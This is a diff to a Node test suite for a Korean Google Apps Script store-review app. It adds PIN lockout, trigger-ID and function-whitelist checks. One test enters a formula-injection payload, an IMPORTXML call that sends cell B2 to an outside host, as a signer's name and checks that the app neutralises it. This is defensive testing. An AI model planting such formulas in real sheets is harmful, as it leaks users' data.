@@ -30,7 +30,11 @@ class Sheet {
   constructor(name) { this.name = name; this.data = {}; this.maxRows = 1000; this.maxCols = 26; }
   key(r, c) { return r + ':' + c; }
   get(r, c) { const v = this.data[this.key(r, c)]; return v === undefined ? '' : v; }
-  set(r, c, v) { if (v === '' || v == null) delete this.data[this.key(r, c)]; else this.data[this.key(r, c)] = v; }
+  set(r, c, v) {
+    // 실제 시트처럼: 앞의 ' 는 「글자로 저장」 표시라 읽을 때 안 보임, ' 없이 = + - @ 로 시작하면 수식이 됨 → 셈만 해 둠
+    if (typeof v === 'string') { if (v[0] === "'") v = v.slice(1); else if (/^[=+\-@]/.test(v)) this.formulas = (this.formulas || 0) + 1; }
+    if (v === '' || v == null) delete this.data[this.key(r, c)]; else this.data[this.key(r, c)] = v;
+  }
   getRange(a, b, c, d) {
     if (typeof a === 'string') {
       const m = a.match(/^([A-Z]+)(\d+)?$/); if (!m) throw new Error('A1 표기 미지원: ' + a);
@@ -90,7 +94,7 @@ const ctx = {
       getFileById: () => ({ makeCopy: (name, fd) => { fd.files.push({ name, trashed: false, getDateCreated: () => new Date(), setTrashed(v) { this.trashed = v; } }); } })
     };
   })(),
-  ScriptApp: (() => { const triggers = []; let fn = ''; const b = { timeBased() { return b; }, everyDays() { return b; }, atHour() { return b; }, after() { return b; }, create() { const h = fn; triggers.push({ getHandlerFunction: () => h }); } };
+  ScriptApp: (() => { const triggers = []; let fn = '', uid = 0; const b = { timeBased() { return b; }, everyDays() { return b; }, atHour() { return b; }, after() { return b; }, create() { const h = fn, u = 'uid' + (++uid); triggers.push({ getHandlerFunction: () => h, getUniqueId: () => u }); } };
     return { _t: triggers, newTrigger: f => { fn = f; return b; }, getOAuthToken: () => 'tok', getProjectTriggers: () => triggers.slice(), deleteTrigger: t => triggers.splice(triggers.indexOf(t), 1) }; })()
 };
 vm.createContext(ctx);
@@ -101,10 +105,10 @@ const ok = (cond, msg) => { if (!cond) { throw new Error('실패: ' + msg); } co
 const run = code => vm.runInContext(code, ctx);
 
 console.log('초기 설정');
-run('setup()');
+run('setupMenu_()');
 ok(ss.getSheetByName('검토서').maxCols >= run('reviewHeaders_().length'), '검토서 시트 열이 헤더 수만큼 늘어남');
 ok(ss.getSheetByName('준수사항').getLastRow() === 8, '준수사항 7개 기본 문구');
-run('setup()'); // 두 번 실행해도 안전
+run('setupMenu_()'); // 두 번 실행해도 안전
 ok(ss.getSheetByName('준수사항').getLastRow() === 8, '초기 설정 재실행해도 중복 없음');
 
 console.log('PIN');
@@ -218,12 +222,17 @@ delete props.SCHEMA_VER;
 ok(run('apiBootstrap(A)').rules[1].indexOf('공사진행 불가') >= 0, '문구 변경은 한 번만 (이후 사용자가 고친 문구는 유지)');
 
 console.log('1.0 · 자동 백업');
-run('enableDailyBackup()');
+run('enableDailyBackup_()');
 ok(ctx.ScriptApp._t.length === 1, '매일 백업 트리거 1개');
-run('enableDailyBackup()');
+run('enableDailyBackup_()');
 ok(ctx.ScriptApp._t.length === 1, '다시 켜도 트리거 중복 없음');
 ok(ctx.DriveApp._folder.files.length >= 2 && /도면협의_백업_/.test(ctx.DriveApp._folder.files[0].name), '백업 사본 생성 ' + ctx.DriveApp._folder.files[0].name);
-run('disableDailyBackup()');
+const nB = ctx.DriveApp._folder.files.length;
+run('backupDaily()'); run('backupDaily({triggerUid:"가짜"})');
+ok(ctx.DriveApp._folder.files.length === nB, '1.8.6 (결정 41): 예약 번호 없이 화면에서 부른 백업은 아무것도 안 함');
+ctx.UIDB = ctx.ScriptApp._t[0].getUniqueId(); run('backupDaily({triggerUid: UIDB})');
+ok(ctx.DriveApp._folder.files.length === nB + 1, '진짜 예약이 부르면 백업');
+run('backupOffMenu_()');
 ok(ctx.ScriptApp._t.length === 0, '자동 백업 끄기');
 
 console.log('1.2 · 드라이브 지침 폴더 · 색인 만들기');
@@ -327,7 +336,7 @@ const ix = run('apiGuideIndex(A)');
 ok(ix.length === 1 && ix[0].d === ctx.BID && ix[0].p === 91, '검색 색인 제공 (항목마다 지침 ID)');
 ok(run(`apiGuidePage(A, "${ctx.BID}", 91)`) === img, '쪽 이미지 data URL');
 ok(run(`apiGuidePage(A, "${ctx.BID}", 999)`) === null, '없는 쪽은 null');
-ok(run('apiBootstrap(A)').version === '1.8.5' && run('apiBootstrap(A)').guides.length === 1, '부트스트랩에 지침 목록');
+ok(run('apiBootstrap(A)').version === '1.8.6' && run('apiBootstrap(A)').guides.length === 1, '부트스트랩에 지침 목록');
 
 // 개정판: 다른 PDF로 같은 지침 바꾸기
 const pdf2 = mkFile('통합안전관리지침_27.pdf', 'application/pdf', Buffer.from('new'), gRoot.id);
@@ -566,13 +575,21 @@ try { run('apiLogin({pin:"9999"})'); } catch (e) {}
 threw = false; try { run('apiLogin({pin:"2468"})'); } catch (e) { threw = /10분 동안/.test(e.message); }
 ok(threw, '20번 틀리면 맞는 PIN도 10분 막음');
 ok(run('apiStart({role:"소장",token:' + JSON.stringify(lg1.token) + '})').role === '소장', '막혀 있어도 기기에 기억된 로그인은 열림');
+// 1.8.6 (결정 41): 6시간 안에 3번째 잠금부터는 1시간
+const failN = n => { for (let i = 0; i < n; i++) { try { run('apiLogin({pin:"0001"})'); } catch (e) {} } };
+const unlockPin = () => { const v = JSON.parse(props.PIN_FAIL); v.lock = Date.now() - 1; props.PIN_FAIL = JSON.stringify(v); };
+unlockPin(); failN(20); let pf = JSON.parse(props.PIN_FAIL);
+ok(pf.locks === 2 && pf.lock - Date.now() <= 600000, '2번째 잠금은 10분');
+unlockPin(); failN(20); pf = JSON.parse(props.PIN_FAIL);
+threw = false; try { run('apiLogin({pin:"2468"})'); } catch (e) { threw = /(5[0-9]|60)분 동안/.test(e.message); }
+ok(pf.locks === 3 && pf.lock - Date.now() > 3000000 && threw, '6시간 안 3번째 잠금은 1시간 (남은 분 표시)');
 delete props.PIN_FAIL;
 ok(run('apiLogin({pin:"1357"})').role === '부소장', '잠금 풀리면 다시 PIN 로그인');
 // 같은 PIN 거부 (시트 메뉴 ② PIN 설정)
 let alerts = [];
 ctx.SpreadsheetApp.getUi = () => ({ prompt: () => ({ getSelectedButton: () => 'OK', getResponseText: () => '1357' }), Button: { OK: 'OK' }, ButtonSet: { OK_CANCEL: 1, OK: 2 }, alert: m => alerts.push(m) });
 const pinBefore = props['PIN_소장'];
-run('setPinChief()');
+run('setPinChief_()');
 ok(props['PIN_소장'] === pinBefore && /부소장 PIN과 같습니다/.test(alerts[0]), '소장 PIN을 부소장 PIN과 같게 바꾸면 거부');
 ctx.RC = { tenant: '소장확인 매장', reviewDate: '2026-10-30' };
 let bc = run('apiSaveReview(A, RC, false)'); ctx.SC = bc.store.id;
@@ -656,6 +673,14 @@ threw = false; try { run('apiSignInfo(TOK2)'); } catch (e) { threw = /7일/.test
 ok(threw, '7일 지나면 만료');
 threw = false; try { run('apiSignInfo("zzzz")'); } catch (e) { threw = /올바르지/.test(e.message); }
 ok(threw, '엉뚱한 링크 거부');
+// 1.8.6 (결정 41): 원격 서명 이름 칸에 수식을 넣어도 글자로 저장
+run('apiSigRequest(A, S8, 1, [{who:"sales", email:"sales.kim@lotte.net"}], "' + pdfUri + '", "검토서3.pdf")');
+ctx.TOK3 = (sent[sent.length - 1].body.match(/\?sign=([0-9a-f]+)/) || [])[1];
+ctx.EVIL = '=IMPORTXML("https://x.io/"&B2,"//a")';
+const rvSh = ss.getSheetByName('검토서'), fBefore = rvSh.formulas || 0;
+run('apiSignSubmit(TOK3, {name: EVIL, tel:"010-2222-3333", sig:"data:image/png;base64,AAAA"})');
+ok((rvSh.formulas || 0) === fBefore && run('reviewOf_(S8, 1)').salesName === ctx.EVIL, '원격 서명 이름에 수식을 넣어도 수식이 되지 않고 글자 그대로');
+ok(run('noFormula_("-3")') === "'-3" && run('noFormula_("010-1")') === '010-1' && run('noFormula_(null)') === '', '= + - @ 로 시작할 때만 앞에 작은따옴표');
 // 블럭 연동
 ctx.ContentService = { MimeType: { JSON: 'json' }, createTextOutput: t => ({ t, setMimeType() { return this; } }) };
 const J = code => JSON.parse(run(code).t);
@@ -749,12 +774,14 @@ const foreign = mkFile('남의사진.jpg', 'image/jpeg', Buffer.from('3'), pRoot
 const alerts2 = []; let promptText = 'new@gmail.com', yesNo = 'YES';
 ctx.SpreadsheetApp.getUi = () => ({ prompt: () => ({ getSelectedButton: () => 'OK', getResponseText: () => promptText }),
   alert: (a, b) => { alerts2.push(b === undefined ? a : b); return yesNo; }, Button: { OK: 'OK', YES: 'YES', NO: 'NO', CANCEL: 'CANCEL' }, ButtonSet: { OK: 1, OK_CANCEL: 2, YES_NO_CANCEL: 3 } });
-promptText = 'old@gmail.com'; run('migrateSend()');
+promptText = 'old@gmail.com'; run('migrateSend_()');
 ok(/같은 주소/.test(alerts2.pop()), '자기 계정 주소는 거부');
 promptText = 'new@gmail.com';
-run('MIG.BUDGET = -1'); run('migrateSend()');
+run('MIG.BUDGET = -1'); run('migrateSend_()');
 ok(/1분 뒤/.test(alerts2.pop()) && ctx.ScriptApp._t.some(t => t.getHandlerFunction() === 'migrateSendResume'), '시간이 모자라면 1분 뒤 이어하기 예약');
 run('MIG.BUDGET = 270000'); run('migrateSendResume()');
+ok(ctx.ScriptApp._t.some(t => t.getHandlerFunction() === 'migrateSendResume'), '1.8.6 (결정 41): 예약 번호 없이 부른 이어하기는 아무것도 안 함');
+ctx.UIDM = ctx.ScriptApp._t.find(t => t.getHandlerFunction() === 'migrateSendResume').getUniqueId(); run('migrateSendResume({triggerUid: UIDM})');
 const tab = () => ss.getSheetByName('_계정이전'), rowsOf = () => tab().getRange(2, 1, tab().getLastRow() - 1, 8).getValues();
 let R = rowsOf(), byId = id => R.find(r => r[0] === id);
 ok(!ctx.ScriptApp._t.some(t => t.getHandlerFunction() === 'migrateSendResume'), '다 끝나면 이어하기 예약 지움');
@@ -766,13 +793,13 @@ ok(perms(ph1).some(x => x.emailAddress === 'new@gmail.com' && x.pendingOwner && 
 ok(apiLog.filter(x => x.startsWith('post')).every(x => /sendNotificationEmail=false/.test(x)), '공유 알림 메일은 보내지 않음');
 alerts2.length = 0;
 // 다시 누르면 이어서 (이미 요청한 것은 건너뜀)
-const nPatch = apiLog.length; yesNo = 'YES'; run('migrateSend()');
+const nPatch = apiLog.length; yesNo = 'YES'; run('migrateSend_()');
 ok(apiLog.length === nPatch && /모두 보냈습니다/.test(alerts2.pop()), '다시 눌러도 같은 요청을 또 보내지 않음');
 // 받기: 기존 계정으로 누르면 안내
-run('migrateAccept()');
+run('migrateAccept_()');
 ok(/새 계정\(new@gmail.com\)/.test(alerts2.pop()), '받기는 새 계정에서만');
 ctx._me = 'new@gmail.com';
-run('migrateAccept()');
+run('migrateAccept_()');
 R = rowsOf();
 ok(/모두 받았습니다/.test(alerts2.pop()) && R.filter(r => r[4] === '요청함').length === 0, '새 계정에서 모두 받음');
 ok(pRoot.owner === 'new@gmail.com' && ph1.owner === 'new@gmail.com' && drive.items.ssid.owner === 'new@gmail.com' && foreign.owner === 'x@other.com', '소유자가 새 계정으로 (남의 파일은 그대로)');
@@ -780,20 +807,20 @@ ok(perms(ph1).some(x => x.emailAddress === 'old@gmail.com' && x.role === 'writer
 ok(run('photoRoot_()').getId() === pRoot.getId(), '옮긴 뒤에도 같은 사진 폴더 (ID 그대로)');
 // 이전 점검
 const fz = run('apiFireDocUpload(A, S8, JPG2)'), fzId = JSON.parse(fz.store.fireDoc).f;
-let ck = run('migrateCheck()');
+let ck = run('migrateCheck_()');
 const ckRows = () => ss.getSheetByName('_이전점검').getRange(2, 1, ss.getSheetByName('_이전점검').getLastRow() - 1, 5).getValues();
 const live = ckRows().filter(r => !/^삭제보관/.test(r[1]));
 ok(live.length >= 3 && live.every(r => r[4] === '이 계정 소유'), '점검: 시트·폴더·협의서가 모두 이 계정 소유 (삭제보관 탭의 지운 매장 사진만 예전 계정) ' + JSON.stringify(ck.counts));
 const base = ck.counts['다른 계정 소유'];
 ok(ckRows().some(r => r[0] === fzId && /방재실협의서/.test(r[1])), '점검 목록에 어디에 쓰였는지 표시 (매장 · 방재실협의서)');
 drive.items[fzId].owner = 'old@gmail.com';
-ck = run('migrateCheck()');
+ck = run('migrateCheck_()');
 ok(ck.counts['다른 계정 소유'] === base + 1 && ck.others[0] === 'old@gmail.com', '아직 기존 계정 소유인 파일을 찾아 줌');
 drive.items[fzId].trashed = true;
-ok(run('migrateCheck()').counts['휴지통'] === 1, '휴지통에 간 파일 표시');
+ok(run('migrateCheck_()').counts['휴지통'] === 1, '휴지통에 간 파일 표시');
 ok(/자동 백업 예약/.test(alerts2.pop()), '점검 결과에 백업 예약·시방서 주소 안내');
 ctx.ScriptApp.newTrigger('migrateAcceptResume').timeBased().after(1).create();
-run('migrateStop()');
+run('migrateStop_()');
 ok(!ctx.ScriptApp._t.some(t => /^migrate/.test(t.getHandlerFunction())), '이어하기 예약 멈추기');
 ctx._me = 'old@gmail.com';
 
@@ -809,9 +836,9 @@ run('settingsSheet_()');
 ok(setSh.getLastRow() === 2, '다시 불러도 줄이 늘지 않음');
 const al = []; let pt = 'http://bad';
 ctx.SpreadsheetApp.getUi = () => ({ prompt: (t, m) => { al.push(m); return { getSelectedButton: () => 'OK', getResponseText: () => pt }; }, alert: (a, b) => { al.push(b === undefined ? a : b); }, Button: { OK: 'OK' }, ButtonSet: { OK: 1, OK_CANCEL: 2 } });
-run('showAddresses()');
+run('showAddresses_()');
 ok(/https:\/\/script\.google\.com\/macros\/s\/APP\/exec/.test(al[0]) && /형식이 맞지 않습니다/.test(al[1]) && setSh.get(2, 2) === '', '메뉴 ⑧: 웹앱 주소 표시, 형식이 틀리면 저장 안 함');
-pt = SHELL; al.length = 0; run('showAddresses()');
+pt = SHELL; al.length = 0; run('showAddresses_()');
 ok(setSh.get(2, 2) === SHELL && /저장했습니다/.test(al[1]) && al[1].indexOf(SHELL + '?store=시험') >= 0, '바로가기 주소 저장 + 시험 주소 안내');
 ok(run('publicLink_("store=abc")') === SHELL + '?store=abc', 'QR 링크 = 바로가기 주소 + ?store=');
 ok(run('apiBootstrap(A)').publicUrl === SHELL && run('apiBootstrap(A)').appUrl === EXEC, '부트스트랩: 화면 QR용 publicUrl, /exec도 그대로');
@@ -823,7 +850,7 @@ run('apiSigRequest(A, S8, 1, [{who:"sales", email:"sales.lee@lotte.net"}], "' + 
 ok(sent.length === n2 + 1 && sent[n2].body.indexOf(SHELL + '?sign=') >= 0 && sent[n2].body.indexOf(EXEC) < 0, '원격 서명 메일 링크 = 바로가기 주소 + ?sign=');
 setSh.set(2, 2, SHELL + '?x=1');
 ok(run('publicLink_("store=abc")') === EXEC + '?store=abc', '시트에서 형식이 틀리게 고치면 쓰지 않고 /exec');
-pt = ''; al.length = 0; run('showAddresses()');
+pt = ''; al.length = 0; run('showAddresses_()');
 ok(setSh.get(2, 2) === '' && /지웠습니다/.test(al[1]) && run('publicLink_("store=abc")') === EXEC + '?store=abc', '비우면 지우고 /exec로');
 // 모든 웹앱 화면 출력에 ALLOWALL
 let xf = null;
@@ -832,5 +859,10 @@ ctx.HtmlService.createTemplateFromFile = () => ({ evaluate: () => { const o = { 
 run('doGet({parameter:{store:"abc"}})'); ok(xf === 'ALLOWALL', 'doGet 화면(?store=) ALLOWALL');
 xf = null; run('doGet({parameter:{sign:"' + 'a'.repeat(40) + '"}})'); ok(xf === 'ALLOWALL', 'doGet 서명 화면(?sign=) ALLOWALL');
 xf = null; run('doGet({parameter:{}})'); ok(xf === 'ALLOWALL', 'doGet 기본 화면 ALLOWALL');
+
+// 1.8.6 (결정 41): 웹앱 화면에서 이름으로 부를 수 있는 함수(이름이 _로 안 끝남)는 정한 것만 — 시트 메뉴 함수는 모두 _
+const pubFns = [...fs.readFileSync(path.join(src, 'Code.gs'), 'utf8').matchAll(/^function\s+([A-Za-z0-9$]+)\s*\(/gm)].map(m => m[1]).filter(n => !/_$/.test(n));
+const badFns = pubFns.filter(n => !/^(doGet|doPost|include|onOpen|api[A-Z]\w*|backupDaily|migrateSendResume|migrateAcceptResume)$/.test(n));
+ok(!badFns.length, '밖에서 부를 수 있는 함수는 진입점·화면용 api…·예약(번호 확인)만 ' + badFns.join(', '));
 
 console.log('\n서버 로직 점검 통과');
